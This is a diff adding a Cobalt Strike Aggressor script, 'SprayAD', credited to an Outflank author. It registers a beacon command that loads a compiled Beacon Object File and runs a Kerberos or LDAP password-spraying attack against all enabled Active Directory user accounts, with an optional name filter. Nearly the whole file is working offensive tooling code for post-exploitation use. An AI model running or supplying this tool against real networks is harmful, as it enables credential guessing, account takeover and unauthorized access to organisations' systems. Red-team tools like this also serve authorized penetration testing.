@@ -1,0 +1,43 @@
+#SprayAD Bof
+#author Cornelis de Plaa
+#@outflank.nl
+
+#register help
+beacon_command_register("SprayAD", "Perform a Kerberos or ldap password spraying attack against Active Directory.",
+	"Test all enabled Active Directory useraccounts for valid passwords.\n\n" .
+	"Synopsis: SprayAD [password] [filter <optional> <example: admin*>] [ldap <optional>]\n\n");
+
+alias SprayAD {
+    $bid = $1;
+
+    $input = substr($0, 8);
+    @args = split(' ', $input);
+
+	$object = @args[0];
+    $ldapfilter = @args[1];
+    $authservice = @args[2];
+
+    if ($object eq "") {
+		berror($bid, "Please specify a password to test.");
+		return;
+	}
+    
+    # Read in the right BOF file
+    $handle = openf(script_resource("SprayAD." . barch($bid) . ".o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    if ($ldapfilter eq "") {
+       $arg_data  = bof_pack($bid, "ZZ", $object, "*");
+    }
+    else if ($ldapfilter eq "ldap") {
+        $arg_data  = bof_pack($bid, "ZZZ", $object, "*", "ldap");
+    }
+    else {
+         $arg_data  = bof_pack($bid, "ZZZ", $object, $ldapfilter, $authservice);
+    }
+    
+    blog($bid, "Let's start spraying useraccounts with password: " . $object);
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
